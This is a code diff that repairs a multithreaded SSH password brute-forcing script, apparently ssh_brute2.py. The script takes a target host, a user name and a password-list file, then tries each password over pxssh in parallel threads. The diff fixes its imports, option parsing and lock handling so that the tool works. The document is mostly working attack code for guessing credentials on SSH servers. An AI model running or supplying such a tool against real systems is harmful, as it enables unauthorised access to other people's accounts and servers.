@@ -1,4 +1,4 @@
-import pxssh
+from pexpect import pxssh
 import optparse
 import time
 from threading import *
@@ -8,10 +8,7 @@ connection_lock=BoundedSemaphore(value=maxConnnections)
 Found=False
 fails=0
 
-def send_command():
-    pass
-
-def connect(host,user,Password):
+def connect(host,user,Password,release):
     global Found
     global fails
     try:
@@ -27,20 +24,20 @@ def connect(host,user,Password):
         elif 'synchronize with original prompt' in str(e):
             time.sleep(1)
             connect(host,user,Password,False)
-        finally:
-            if release:
-                connection_lock.release()
+    finally:
+        if release:
+            connection_lock.release()
 
 def main():
-    parser==optparser.OptionParser("usage%prog" +"-H <Target Host> -u <user> -P <Password List>")
+    parser=optparse.OptionParser("Usage: ssh_brute2.py " +"-H <Target Host> -u <user> -P <Password List>")
     parser.add_option('-H',dest='tgthost',type='string',help='Specify target host')
-    parser.add_option('-u' dest='user',type='string',help='Specify the user')
-    parser.add_option('-P' dest='passwdFile',type='string',help='Specify the Password')
+    parser.add_option('-u' ,dest='user',type='string',help='Specify the user')
+    parser.add_option('-P' ,dest='passwdFile',type='string',help='Specify the Password')
     (options,args)=parser.parse_args()
     host=options.tgthost
     passwdFile=options.passwdFile
     user=options.user
-    if host==None | passwdFile==None | user==None :
+    if host==None or passwdFile==None or user==None :
         print(parser.usage)
         exit(0)
     file=open(passwdFile,'r')
@@ -53,7 +50,7 @@ def main():
             exit(0)
         connection_lock.acquire()
         Password=line.strip('\r').strip('\n')
-        print('[-] Testing: '+ Password)
+        print('[*] Testing: '+ Password)
         t=Thread(target=connect,args=(host,user,Password,True))
         child=t.start()
 
